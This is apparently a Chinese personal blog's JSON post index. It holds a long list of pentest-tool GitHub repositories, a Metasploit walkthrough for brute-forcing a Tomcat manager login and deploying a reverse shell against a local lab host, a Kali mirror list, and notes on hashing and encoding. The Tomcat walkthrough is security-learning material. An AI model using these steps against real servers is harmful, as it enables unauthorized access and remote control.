https://github.com/hacktoolspack/-penetrator-sql-injection- https://github.com/Zer0day/zer0pack https://github.com/barkink/Port-Scanner https://github.com/BlackyFox/PenTools https://github.com/gheld/burp-g2plugins https://github.com/andonidiaz/leviathan https://github.com/Exploit-install/CrackMapExec https://github.com/tlenclos/opentest https://github.com/Selora/jester https://github.com/jksdua/sec-cheat-sheet https://github.com/sudo-root-team/Tools https://github.com/HackerAdana/hapentool https://github.com/nim4/tools https://github.com/LandGrey/dnstricker https://github.com/quentinlamamy/bashbunny-payloads https://github.com/S1lent80/Project-A.N.D-X https://github.com/trollarepoop/GForce https://github.com/ryanbaxendale/login_autopwn https://github.com/v4lproik/WIAS https://github.com/jeffzh3ng/Pentest https://github.com/cloudrck/PenTest https://github.com/wg135/pentest https://github.com/techgaun/hack-scripts https://github.com/cheki/pentest https://github.com/anggrahito/pentest https://github.com/p0werc1ick/pentest https://github.com/svenpruefer/pentest https://github.com/ihafiri/Pentest https://github.com/codesniffer/pentest https://github.com/synackme/pentest https://github.com/AKx2f/pentest https://github.com/conceptofproof/Pentest https://github.com/Siegfried148/Pentest https://github.com/genba/pentest https://github.com/linuxjustin/Pentest https://github.com/TotoroC/Pentest_training https://github.com/noopzen/pentesting https://github.com/xj90512/pentest-bookmarks https://github.com/tdifg/hackbox https://github.com/SifoHamlaoui/Pentest-Bookmarkz https://github.com/PentestBox/pentest-box-modules https://github.com/azarane/AASTRA_ToIP https://github.com/tsondt/osce https://github.com/hegusung/VNCPwn https://github.com/Exploit-install/pentestly https://github.com/Exploit-install/pentester https://github.com/crypiehef/pentestinglab https://github.com/n8zwn/pentestcheatsheets https://github.com/jchiefelk/pentesting https://github.com/tlhcelik/pentestme https://github.com/samukasmk/introducao-a-pentest-com-python https://github.com/owtf/owtf-crawljax https://github.com/louchaooo/A77 https://github.com/eye9poob/twitter-pentest https://github.com/AlienCoders/pentest_scripts https://github.com/KeyStrOke95/Pentest-ZOne https://github.com/d5nypt3r/OSCP-Pentest https://github.com/lnln1111/pentest-bookmarks https://github.com/odlanyer37/pentest-scripts https://github.com/Webschool-io/Curso-Pentest https://github.com/marrocamp/Impressionante-pentest https://github.com/robinlennox/pentest_scripts https://github.com/milports/pentest-framework https://github.com/antonyfanta/pentest-bookmarks https://github.com/beakman/pentest-tools https://github.com/netbiosX/Pentest-Commands https://github.com/no1deer/pentest-menu https://github.com/sunhwan/lipid-pentest https://github.com/MalwareLu/pentest_bootstrap https://github.com/zhiwenuil/Metasploit_Pentest https://github.com/alacerda/setup-pentest https://github.com/ninoz/pentest-scripts https://github.com/Dedal0/PythonPentest https://github.com/sodejm/Pentest-Scripts https://github.com/mac3747/pentest_bookmarks https://github.com/trietptm/pentest-bookmarks https://github.com/redBu1l/pentest_book https://github.com/anpseftis/bug_bounty_hunter https://github.com/teamghsoftware/herramientas_pentesting_python https://github.com/tjcim/ptscripts https://github.com/khast3x/Offensive-Dockerfiles https://github.com/mandeepjadon/PentesterAcademySolutions https://github.com/J4NN0/wordlist https://github.com/paradoxxx/Sample-Pentest-Code https://github.com/CarlAmbroselli/PenTest-Toolbox https://github.com/pwn4food/docker-for-pentest https://github.com/proxyanon/Python-Pentest-Tools https://github.com/PentestBox/pentest-box-forum https://github.com/jpaulolins/dockerfiles-pentest-tools https://github.com/Yukinoshita47/Pentest-Tools-Auto-Installer https://github.com/shipcod3/vulnstrap https://github.com/RedLee3/Pentest-in-a-Box https://github.com/ajurkic/pentest-and-python https://github.com/j105rob/PenTest-File-Tracker https://github.com/bairob767/Security-Pentest-Metasploit https://github.com/bossjones/pentest-linux-privileges https://github.com/Rojasknight/Tools-Pentest-Python https://github.com/pentest-0/Windows-Pentest-Using-Commands https://github.com/chris99ls/python-pentest-script https://github.com/AdamGreenhill/InvisibleProxy https://github.com/ZkClown/GetPwd https://github.com/bboybreeze/JDS_NETWORK_PEN-TESTING_TOOL https://github.com/mburakergenc/Cybersecurity-Lab-Practices https://github.com/defendthehoneypot/MacSTIG https://github.com/rwboy/pydra https://github.com/bxlcity/Book_Pentesting https://github.com/ofasgard/Pentesting-Tools https://github.com/jcapellman/jcMPP https://github.com/rabx/Pentesting-CheatSheet https://github.com/s1ckboy/pentesting-methodology https://github.com/arthurwayne/awesome-pentester https://github.com/pwn-network/Snip3r https://github.com/ru-faraon/pen-utils https://github.com/NoDisassemble/Python-3-PenTesting https://github.com/antonis-manaras/802.11 https://github.com/levigross/IPv6-Tools https://github.com/psychsecurity/Pentest-Commands-and-dirty-scripts- https://github.com/psychsecurity/iOS-Pentesting https://github.com/neroptik76/faith https://github.com/blackb1rd/Script-Pentool https://github.com/444xxk/hacknowledge https://github.com/0d4rk30/homebrew-hackbrew https://github.com/hwoadministrator/KLI-Project-Pentest-Version1.0.1 https://github.com/Gh0stDragon/Gh0stBox https://github.com/toxydose/pnwgen https://github.com/Kan1shka9/Javascript-for-Pentesters https://github.com/sibichakkaravarthy/Automated-Pentesting-for-Windows https://github.com/Goovscoov/Hacking-Pentesting-Stuff https://github.com/sunilpottumuttu/csharp-pentesting-tools https://github.com/thsle3p/code-for-pentesting https://github.com/nikamajinkya/PenTestFramework https://github.com/ACandeias/PenTestingScripts https://github.com/Shrewk/WebAttacker https://github.com/zackiles/ForkSuite https://github.com/willc/willc-scripts https://github.com/Kolahzary/PHP-DoS https://github.com/LordWeeble/Recon-Scans https://github.com/sha0coder/bwcontrol https://github.com/Jhype/BreakoutScripts https://github.com/aaronkaplan/scandb https://github.com/ishangirdhar/infosec https://github.com/wi-fi-analyzer/netool-toolkit https://github.com/ironStark/Bruter https://github.com/loanvaque/nsee https://github.com/ironStark/hiCrack https://github.com/CaiJiJi/dirscanner https://github.com/bairob767/Security-Test-ZedAttackProxi-Mutillidae2 https://github.com/nrohsak/Secpi https://github.com/as0ler/MethodSwizzlingDemo https://github.com/simontoft/VCSRip https://github.com/DutrAT9/T9 https://github.com/jokigonya/PowerShell https://github.com/ricardosantos9/Programs https://github.com/jan-mueller/repo-ftp https://github.com/sslavov93/kali-linux-tools https://github.com/rufusraghunath/csrfun https://github.com/jrmdev/binder https://github.com/dwin999/ptscripts https://github.com/sharad1126/network-pentesing-scripts https://github.com/dreweggers/Vectrons_Klaw https://github.com/lodeale/Benzetacil https://github.com/enderax/penex https://github.com/gentoo-mirror/spike https://github.com/PaulSec/Raspberry-APT https://github.com/appseckev/python_hacking_library https://github.com/ppolstra/4deck https://github.com/ironbits/Scylla https://github.com/Exploit-install/PSAttack https://github.com/droidhopper/Android-Hopper https://github.com/joeduncan/xsrf-auth https://github.com/MrJester/click_scripts https://github.com/sahilrai85/droidhopper https://github.com/gvb84/pt-utils https://github.com/WeeFeeSuite/WeeFee https://github.com/Astralcloud-Studios/lyapi-linux https://github.com/Exploit-install/OWASP-mth3l3m3nt-framework https://github.com/Jonatasdxt/funtoolkit-super https://github.com/iGh0st/Utilite-Build--Kali-Scripts https://github.com/rushpuppych/PipOs https://github.com/linuxsec/pentest https://github.com/ChiefRiver/Pentest https://github.com/vwieczorek/pentest https://github.com/atlantis2013/pentest https://github.com/Abda3DU/Pentest https://github.com/skokcu/pentest https://github.com/CipherScruples/pentest https://github.com/tfranca2/pentest https://github.com/nirvana74v/penTest https://github.com/piochu/pentest https://github.com/jo5hua/PenTest https://github.com/reyjo/pentest https://github.com/navalgup/PenTest https://github.com/shaft75/Pentest https://github.com/ooooooo-q/pentest https://github.com/Downgraderz/Pentest https://github.com/tilunf/pentest https://github.com/ITPPA/pentest https://github.com/moemyintshein/pentest https://github.com/Luistor/Pentest https://github.com/gaurav-1989/pentest https://github.com/Sanpu/Pentest https://github.com/maprfc/pentest https://github.com/doanthingoclan/Pentest https://github.com/ch1jske1/pentest https://github.com/netpest/pentest https://github.com/khanhnnvn/pentest https://github.com/hytechsg/pentest https://github.com/rayneh/pentest https://github.com/0xcuri0us/PenTest https://github.com/mwielgoszewski/pentest https://github.com/0x7b4/pentest https://github.com/khayriX/pentest https://github.com/abdulrahman86/pentest https://github.com/kai5263499/pentest https://github.com/fvapore/PenTest https://github.com/brujoand/pentest https://github.com/Voraka/Pentest https://github.com/vengeancexe/pentest https://github.com/hcary/pentest https://github.com/gcxtx/pentest https://github.com/h4ckl0g1c/pentest https://github.com/Abda3pentest/pentest https://github.com/roo7break/Pentest https://github.com/d1m3r/pentest https://github.com/b4dboy/pentest https://github.com/lufl0rd/pentest https://github.com/shyrusjos/Pentest https://github.com/invivid/pentest https://github.com/LuckyToons/pentest https://github.com/the-domains/pentest https://github.com/Xanthonus/pentest https://github.com/brunoviu/Pentest https://github.com/m2f0/pentest https://github.com/saturbo/pentest https://github.com/Shuqin2017/PenTest https://github.com/sil0/Pentest https://github.com/vuhmai/PenTest https://github.com/RaspPiTor/PenTest https://github.com/Cnlouds/pentest https://github.com/paulocaram/PENTEST https://github.com/knharo/pentest https://github.com/sheepilja/Pentest https://github.com/litchdao/pentest https://github.com/at2336/Pentest https://github.com/jessemtso/pentest https://github.com/robly78746/pentest https://github.com/Anndrei2000/Pentest https://github.com/yakar/pentest https://github.com/SIGD7/Pentest https://github.com/rifadito/pentest https://github.com/Gititandhitit/pentest https://github.com/Dosk3n/PenTest https://github.com/Exi1Sh0w/Pentest https://github.com/shonen787/Pentest https://github.com/jaimaadurga/Pentest https://github.com/pysy2k/pentest https://github.com/i3ef0xh4ck/Pentest https://github.com/ALUNOdesec/pentest https://github.com/aas-n/pentest https://github.com/bladeism/pentest https://github.com/tmarquar/PenTest https://github.com/rskvp93/pentest https://github.com/tin22ooo/pentest https://github.com/kingsol/pentest https://github.com/carneyf1d/penTest https://github.com/Romulocs/pentest https://github.com/smk1/pentest https://github.com/veerkumar/pentest https://github.com/A11riseforme/pentest https://github.com/ijpmas/pentest https://github.com/linpengstc/pentest https://github.com/coverstreet/pentest https://github.com/nicholas5416/pentest https://github.com/gilsony/pentest https://github.com/pwnhack/pentest https://github.com/branover/pentest https://github.com/mikoslow/pentest https://github.com/GumdropGary364/Pentest https://github.com/aramirez84/Pentest https://github.com/Sisyfus/pentest https://github.com/neil-davis/pentest https://github.com/ITparanoia/PENTEST https://github.com/n8sec/pentest https://github.com/5parkp1ug/PenTest https://github.com/TheRagingDragon/PenTest https://github.com/rsaidi75012/Pentest https://github.com/Valsaa/pentest https://github.com/chris134pravin/Pentest https://github.com/BrenoSS/Pentest https://github.com/nguyenohat/Pentest https://github.com/schaotix/pentest https://github.com/ealfeky/Pentest https://github.com/C0d3Indi4/pentest https://github.com/hackthymia/pentest https://github.com/nastermodz/Pentest https://github.com/l4nt3r4/pentest https://github.com/Sourft/Pentest https://github.com/dianamontes1516/pentest https://github.com/jlFCiencias/Pentest https://github.com/angelmend/pentest https://github.com/RieqyRDM/Pentest https://github.com/iostack/Pentest https://github.com/Guierrmoh/pentest https://github.com/loic564492/Pentest https://github.com/p01ice/pentest https://github.com/dhymi/pentest https://github.com/unisec/pentest https://github.com/DavidKutik/pentest https://github.com/Renvers/pentest https://github.com/hackernix/Pentest https://github.com/wbmartin/pentest https://github.com/stambla/pentest https://github.com/reikanger/pentest https://github.com/ratamaq/pentest https://github.com/michaely23/pentest https://github.com/thanhsuffo/pentest https://github.com/posi91/pentest https://github.com/Faidon09/Pentest https://github.com/frap/pentest https://github.com/nuke99/pentest https://github.com/DavidovskiDm/PenTest https://github.com/eulaureus/pentest https://github.com/vsbca/Pentest https://github.com/expert4u-rahul/Pentest https://github.com/richard-clifford/Pentest https://github.com/Emersonxuelinux/pentest https://github.com/nullxfe/pentest https://github.com/dropwiki/pentest https://github.com/MRajak101/Pentest https://github.com/pushashaft/PenTest https://github.com/gmolveau/pentest https://github.com/FreddyKrugR/pentest https://github.com/LasVegasCoder/PenTest https://github.com/redBu1l/pentest https://github.com/Cy83rV37/PenTest https://github.com/Siscoo/Pentest https://github.com/austinjalexander/pentest https://github.com/Jurand1r/pentest https://github.com/vimn4n0/pentest https://github.com/guillermo85/PentestingApp https://github.com/langocson8125/Pentest_training https://github.com/nguyenminhnhat1997/Pentest_training https://github.com/PIBempos/Pentest https://github.com/qdmetasploit/pentest https://github.com/yywf/pentest https://github.com/tgapon/Pentest https://github.com/king-dracula/pentest https://github.com/jccapetown/pentest https://github.com/beike2020/pentest https://github.com/ealmeidaneto/pentest https://github.com/KosukeShimofuji/pentest https://github.com/RHeijnen/PenTest https://github.com/JChelzaFeducia/Pentest- https://github.com/Farmaleon/pentest- https://github.com/prabhatpanwar/pentest. https://github.com/whbull/utiles https://github.com/mikeanth/kali https://github.com/waynehack/metasploit-framework-git https://github.com/medoabda3/medoabda3 https://github.com/oakes8585/socialengieering https://github.com/Vvtogether/G-s-treasure https://github.com/niiprymez/Prymez https://github.com/hackercabeca/Rena https://github.com/oszo/rvp https://github.com/RDVanWinkle/PT17 https://github.com/gantie/kali https://github.com/Trietptm-on-Security/Pentest-5 https://github.com/waynehack/metasploit https://github.com/gilsony/gilsony https://github.com/ICMP01/MRROBOT https://github.com/waynehack/metasploit-frameework https://github.com/safety-mirror/golismero-suite https://github.com/multitic/assaultjs https://github.com/jtof-fap/verifHostname https://github.com/stevecoward/ansible-pentest-deploy https://github.com/rahulunair/attack_payloads https://github.com/EchoNine/Bash-artillery-scripts https://github.com/aishee/Autopwn-Wifi https://github.com/Kan1shka9/Finger-User-Enumeration https://github.com/johnemanon/Senior-Developer-Challenge https://github.com/bastich/pentesting https://github.com/PierreND/pentesting https://github.com/ir0njaw/pentesttoolz https://github.com/alexbubly/Pentestsoftware https://github.com/danieldevill/Pentester https://github.com/aleksannikit/pentestit https://github.com/InfoDix/Pentesting https://github.com/igbt6/Pentesting https://github.com/multithreadke/pentestke https://github.com/agostinopanico/pentestingcourse https://github.com/rootxharsh/pentestrelated https://github.com/uday-samsani/pentesting https://github.com/crazypalestine/pentesting https://github.com/brianSchanbacher/pentesting https://github.com/garethwillis/pentesting https://github.com/adorofeev82/pentestreport https://github.com/littlepwnie/pentesting https://github.com/cys3c/pentesting https://github.com/j4np0l/pentesting https://github.com/WillArevalo/Pentesting https://github.com/warriar/pentesttools https://github.com/CristianoTomas/PENTESTRoot https://github.com/chris-bc/pentesterlab https://github.com/toxic-byt3/pentesting https://github.com/bradleybossard/pentesterlab https://github.com/MasterSnipes/Pentesting https://github.com/Danladi/pentesting https://github.com/Dit81/pentesttools https://github.com/Enderspeaker/pentesting https://github.com/sicurolab/pentesting https://github.com/baoxiaofeng/pentestion https://github.com/igorcap/pentesting https://github.com/yuchong-pan/pentester https://github.com/fermarcos/Pentesting https://github.com/santiago-10/pentesting https://github.com/buffersandbeer/pentestingwithdevops https://github.com/madhawam-a/Pentesting https://github.com/congrallion/pentesting https://github.com/sjhonatan/pentesting https://github.com/anonxcode/pentestlib https://github.com/mikelaz/Pentesting https://github.com/hatlord/pentestbuilder https://github.com/KEVINCASTER/pentester https://github.com/superchooper42/pentesting https://github.com/mahmoudihatem1980/pentesting https://github.com/pwn0wned/pentestme https://github.com/daniel-ammann/Pentesting https://github.com/tarunkant/pentesteracademylab https://github.com/murat-kaya/pentesting https://github.com/mechanico/Pentesting https://github.com/vignemale3299/Pentesting https://github.com/DrAlienTech/pentesting https://github.com/kamusin/pentesteracademy https://github.com/Savvy95/pentesting https://github.com/bigshebang/pentesting https://github.com/xjasmine/pentester https://github.com/chrisbrune/pentesting https://github.com/cyberhack255/Pentestingscripts https://github.com/zhenyufu/pentestinglab https://github.com/pentestarea/pentestarea https://github.com/Mavni/Pentesting https://github.com/angelwhu/pentesterlab https://github.com/tayzarkyaw/pentesting https://github.com/queceo/Pentesting https://github.com/DanielRTeixeira/Pentesting https://github.com/slackey2000/Pentestingnotes https://github.com/0WND4RK/pentests https://github.com/cynicalC0der/pentesting https://github.com/wiref4lcon/pentesting https://github.com/zwagle/pentestnotes https://github.com/ashik685/Pentesting https://github.com/air01a/pentestingtools https://github.com/Shiva108/pentesting https://github.com/paulwaltonsainsburys/pentesting https://github.com/BraedenHopper99/Pentesting https://github.com/alexandrma/pentestit https://github.com/fewzy/pentesting https://github.com/rossirule2012/Pentesting https://github.com/prometheanworld/pentester https://github.com/Leroygirl/pentestutil https://github.com/ernestosequeira/pentesting https://github.com/aasifrafiq/pentesting https://github.com/alexwiththescar/pentestingtools https://github.com/tgapon/pentestit https://github.com/staikounet/pentesting https://github.com/LibertyUnix/pentesting https://github.com/ethankurt/pentesting https://github.com/bipinxettry/Pentesting https://github.com/JWColeman/PENTesting https://github.com/unvanx/pentesting https://github.com/iamth3squid/Pentesting https://github.com/PentesterDesk/pentesterdesk https://github.com/benaridan/pentesting https://github.com/Desicri/pentesting https://github.com/aaswe/pentesting https://github.com/vaginessa/pentestlinks https://github.com/rwsdigital/pentestit https://github.com/cipek01/Pentesting https://github.com/jmalop/pentesting https://github.com/teeknofil/TheHackToolBoxTeek https://github.com/orsinium/memcached https://github.com/impentester/pentestTools https://github.com/joaogodinho/pentestitv7 https://github.com/gillesdubois/PentestScripts https://github.com/qberdugo/PENTEST101 https://github.com/VikzSharma/PentestBegins https://github.com/FrackMacker/PentestCode https://github.com/Zendari/PentestTools https://github.com/ikuya/PentestToolbox https://github.com/giper45/PentestUtils https://github.com/hackzsd/PentestCommands https://github.com/PhoenixB1rd/PentestingTools https://github.com/TheOptimas/PentestingPrototype https://github.com/sjstore2/PentestLab https://github.com/Darcade/PentestTeensy https://github.com/phrewww/PentestManager https://github.com/alfredleo/PentestCommands https://github.com/h4ng3r/PentestingTools https://github.com/BaraSec/PentestingScripts https://github.com/WhiteIsClosing/PentestScript https://github.com/ayomawdb/PentestDocker https://github.com/spinnyhatkid/PentestSSHConfigs https://github.com/krazysam/PentestScript https://github.com/shuhuqing/PentestBox https://github.com/DeMoorJasper/PentestBuddy https://github.com/eugenenosenko/PentestingTools https://github.com/cnbird1999/PentestPWNShell https://github.com/secshell/PentestTools https://github.com/LotusPaste/PentesterLab https://github.com/nikamajinkya/PentestEx https://github.com/SeyyedMahdiHP/PentesterAcademy https://github.com/KyxRecon/pentestlyKyx https://github.com/pcasas/pentestingPython https://github.com/bashthebash/PentestingTools https://github.com/tirzaz/PentestBot https://github.com/intosec/PentestPlatform https://github.com/wengyusu/pentest1 https://github.com/KyhleOhlinger/PentestScripts https://github.com/sylm87/PentestWEB https://github.com/meliht/PentestAutomation https://github.com/medelibero/PentestTools https://github.com/zachrlawson/PentestingTools https://github.com/Bodnar05/PentestLab https://github.com/Arrab/PentesterWeb https://github.com/alexander-ma/pentestw8 https://github.com/katiejng/PentesterLabs https://github.com/Penworks/pentest2 https://github.com/cbrnrd/PentestFolder https://github.com/envsstroudy/PentestingStuff https://github.com/itsec4u/pentest-scripts https://github.com/rcarroll215/Chef-pentest https://github.com/sohaip-hackerDZ/download-tools-hacking-pentest https://github.com/gsharpsh00ter/pentest https://github.com/roflware/pentest https://github.com/nik-rusak/PenTest https://github.com/ClaudeBuntschu/Pentest https://github.com/addisonamiri/pentest https://github.com/GaryMeliman/pentest https://github.com/fredericmohr/pentest https://github.com/hussein-5/pentest https://github.com/nrlakin/pentest https://github.com/BadTasTe-/Pentest https://github.com/oorozcoo/pentest https://github.com/ccamm1/pentest https://github.com/leandrob/pentest https://github.com/ricardosantos9/pentest https://github.com/findsomeone/pentest https://github.com/testmerk/pentest https://github.com/ivanpadawan/Pentest https://github.com/Jeios/pentest https://github.com/dmoranf/pentest https://github.com/Tetdoss/pentest https://github.com/ksteve/pentest https://github.com/shwetabhsuman/PENTEST https://github.com/Ekzorcist/pentest https://github.com/imr10/Pentest https://github.com/c002/pentest https://github.com/K0r1g4n/Pentest信安之路团队成员收集整理的与渗透测试相关的 Github 项目地址","categories":[],"tags":[]},{"title":"Metasploit爆破Tomcat弱口令","slug":"mest-tomcat","date":"2018-09-16T12:33:09.000Z","updated":"2019-04-18T11:27:50.533Z","comments":true,"path":"2018/09/16/mest-tomcat/","link":"","permalink":"http://lilifengcode.github.io/2018/09/16/mest-tomcat/","excerpt":"","text":"Metasploit爆破Tomcat弱口令 0x00 tomcat 爆破 nmap 扫描主机 【依然本地搭建的】执行命令 nmap –sV 192.168.6.16 可以发现8080端口开着tomcat kali终端中输入命令“msfconsole”，启动MSF终端。 在msf终端下输入命令“search tomcat”, 搜索tomcat的相关工具和攻击载荷 在终端输入“use auxiliary/scanner/http/tomcat_mgr_login”， 启用漏洞利用模块, 提示符就会提示进入到该路径下 在终端输入“show options ” 查看需要配置的参数 终端下输入“set RHOSTS 192.168.6.16”,设置攻击目标主机IP 终端下输入“set RPORT 8180”,设置攻击目标主机端口号 终端下输入“exploit”, 实施攻击 账户密码都是tomcat 0x01 反弹shell,建立会话 终端下输入“use exploit/multi/http/tomcat_mgr_deploy” 终端下输入“set RHOST 192.168.6.16”,设置攻击的目标主机IP终端下输入“set RPORT 8080”,设置攻击目标主机端口号 终端下输入“set username tomcat”,设置攻击时使用的登录账号tomcat终端下输入“set password tomcat”,设置攻击时使用的密码tomcat run 开始攻击","categories":[],"tags":[]},{"title":"kali更新源 2018.7月","slug":"kali更新源 2018.7月","date":"2018-07-27T13:57:35.000Z","updated":"2019-04-17T13:58:04.078Z","comments":true,"path":"2018/07/27/kali更新源 2018.7月/","link":"","permalink":"http://lilifengcode.github.io/2018/07/27/kali更新源 2018.7月/","excerpt":"","text":"kali更新源 2018.7月输入leafpad /etc/apt/sources.list 复制下面内容，粘贴即可 #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 原文地址：https://blog.csdn.net/xfyangle/article/details/81055093","categories":[],"tags":[]},{"title":"Coding List","slug":"Coding list","date":"2018-03-07T07:15:17.000Z","updated":"2019-04-13T14:42:25.880Z","comments":true,"path":"2018/03/07/Coding list/","link":"","permalink":"http://lilifengcode.github.io/2018/03/07/Coding list/","excerpt":"","text":"Coding List不可逆编码方式 MD4 MD4是麻省理工学院教授Ronald Rivest于1990年设计的一种信息摘要算法。它是一种用来测试信息完整性的密码散列函数的实行。其摘要长度为128位，一般128位长的MD4散列被表示为32位的十六进制数字。这个算法影响了后来的算法如MD5、SHA 家族和RIPEMD等。 MD4(123)=C58CDA49F00748A3BC0FCFA511D516CB MD5 MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式（就是把一个任意长度的字节串变换成一定长的十六进制数字串）。 对MD5算法简要的叙述可以为：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。 MD5加密后所得到的通常是32位的编码，而在不少地方会用到16位的编码，16位加密就是从32位MD5散列中把中间16位提取出来！其实破解16位MD5散列要比破解32位MD5散列还慢，因为他多了一个步骤,就是使用32位加密后再把中间16位提取出来, 然后再进行对比，而破解32位的则不需要,加密后直接对比就可以了 。 16位：MD5(123)=AC59075B964B0715 32位：MD5(123)=202CB962AC59075B964B07152D234B70 MD6 (了解) MD6是一种算法。继MD5被攻破后，在Crypto2008上， Rivest提出了MD6算法，该算法的Block size为512 bytes(MD5的Block Size是512 bits), Chaining value长度为1024 bits, 算法增加了并行 机制，适合于多核CPU。 SHA1 安全哈希算法（Secure Hash Algorithm）主要适用于数字签名标准 （Digital Signature Standard DSS）里面定义的数字签名算法（Digital Signature Algorithm DSA）。对于长度小于2^64位的消息，SHA1会产生一个160位的消息摘要。当接收到消息的时候，这个消息摘要可以用来验证数据的完整性。在传输的过程中，数据很可能会发生变化，那么这时候就会产生不同的消息摘要。 SHA1有如下特性：不可以从消息摘要中复原信息；两个不同的消息不会产生同样的消息摘要,(但会有1x10 ^ 48分之一的机率出现相同的消息摘要,一般使用时忽略)。 SH1(123)=40bd001563085fc35165329ea1ff5c5ecbdbbeef SHA2 SHA-224、SHA-256、SHA-384，和SHA-512并称为SHA-2。新的散列函数并没有接受像SHA-1一样的公众密码社区做详细的检验，所以它们的密码安全性还不被大家广泛的信任。虽然至今尚未出现对SHA-2有效的攻击，它的算法跟SHA-1基本上仍然相似；因此有些人开始发展其他替代的散列算法。 SHA224(123)= 78d8045d684abd2eece923758f3cd781489df3a48e1278982466017f SHA256(123)= a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3 SHA384(123)= 9a0a82f0c0cf31470d7affede3406cc9aa8410671520b727044eda15b4c25532a9b5cd8aaf9cec4919d76255b6bfb00f SHA(123)= 3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2 SHA3 由于近年来对传统常用Hash 函数如MD4、MD5、SHA0、SHA1、RIPENMD 等的成功攻击，美国国家标准技术研究所（NIST）在2005年、2006年分别举行了2届密码Hash 研讨会；同时于2007年正式宣布在全球范围内征集新的下一代密码Hash算法，举行SHA-3竞赛•新的Hash算法将被称为SHA-3，并且作为新的安全Hash标准，增强现有的FIPS 180-2标准。算法提交已于2008年10月结束，NIST 将分别于2009年和2010年举行2轮会议，通过2轮的筛选选出进入最终轮（final round）的算法，最后将在2012年公布获胜算法。公开竞赛的整个进程仿照高级加密标准AES 的征集过程。2012年10月2日，Keccak被选为NIST竞赛的胜利者， 成为SHA-3.。 SHA-3，之前名为Keccak算法，是一个加密杂凑算法。SHA-3并不是要取代SHA-2，因为SHA-2目前并没有出现明显的弱点。由于对MD5出现成功的破解，以及对SHA-0和SHA-1出现理论上破解的方法，NIST感觉需要一个与之前算法不同的，可替换的加密杂凑算法，也就是现在的SHA-3。 RIPEMD-160哈希加密算法 RIPEMD-160 是一个 160 位加密哈希函数。它旨在用于替代 128 位哈希函数 MD4、MD5 和 RIPEMD。RIPEMD 是在 EU 项目 RIPE（RACE Integrity Primitives Evaluation，1988-1992）的框架中开发的。 RIPEMD（123）=e3431a8e0adbf96fd140103dc6f63a3f8fa343ab 可逆编码方式 url编码 url编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值 ，将它们以name/value参数编码（移去那些不能传送的字符，将数据排行等等） 作为URL的一部分或者分离地发给服务器。 http://www.xxx.com/index.php?parameter=123&amp;code=del http%3a%2f%2fwww.xxx.com%2findex.php%3fparameter%3d123%26code%3ddel ASCll编码 最早的计算机在设计时采用8个比特（bit）作为一个字节（byte），所以，一个字节能表示的最大的整数就是255（二进制11111111=十进制255），0 - 255被用来表示大小写英文字母、数字和一些符号，这个编码表被称为ASCII编码，比如大写字母A的编码是65，小写字母z的编码是122。 unicode编码： Unicode 给所有的字符指定了一个数字用来表示该字符，Unicode通常用两个字节表示一个字符，原有的英文编码从单字节变成双字节，只需要把高字节全部填为0就可以。 UTF-8编码： UTF-8编码规则：如果只有一个字节则其最高二进制位为0；如果是多字节，其第一个字节从最高位开始，连续的二进制位值为1的个数决定了其编码的字节数，其余各字节均以10开头。UTF-8转换表表示如下： Base64编码 Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。可查看RFC2045～RFC2049，上面有MIME的详细规范。 Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。例如，在Java Persistence系统Hibernate中，就采用了Base64来将一个较长的唯一标识符（一般为128-bit的UUID）编码为一个字符串，用作HTTP表单和HTTP GET URL中的参数。在其他应用程序中，也常常需要把二进制数据编码为适合放在URL（包括隐藏表单域）中的形式。此时，采用Base64编码具有不可读性，需要解码后才能阅读。 计算机单位： 位：bit，是电子计算机中最小的数据单位。每一位的状态只能是0或1。 字节：Byte，8个二进制位构成1个”字节(Byte，可简写为B)”，它是存储空间的基本计量单位。1个字节可以储存1个英文字母或者半个汉字，换句话说，1个汉字占据2个字节的存储空间。 字：”字”由若干个字节构成，字的位数叫做字长，不同档次的机器有不同的字长。例如一台8位机，它的1个字就等于1个字节，字长为8位。如果是一台16位机，那么，它的1个字就由2个字节构成，字长为16位。字是计算机进行数据处理和运算的单位。 KB：在一般的计量单位中，通常K表示1000。只是这时K表示1024，也就是2的10次 方。1KB表示1K个Byte，也就是1024个字节。1KB=1024B 1KB=1024B=210B 1MB=1024KB=10241024B=220B 1GB=1024MB=10242014KB=102410241024B=230B 1TB=1024GB=240B ` 时刻提醒自己的，基础是基石 `","categories":[],"tags":[]},{"title":"Hexo Command","slug":"Hexo Command","date":"2018-01-14T04:52:33.000Z","updated":"2019-04-14T13:32:41.179Z","comments":true,"path":"2018/01/14/Hexo Command/","link":"","permalink":"http://lilifengcode.github.io/2018/01/14/Hexo Command/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}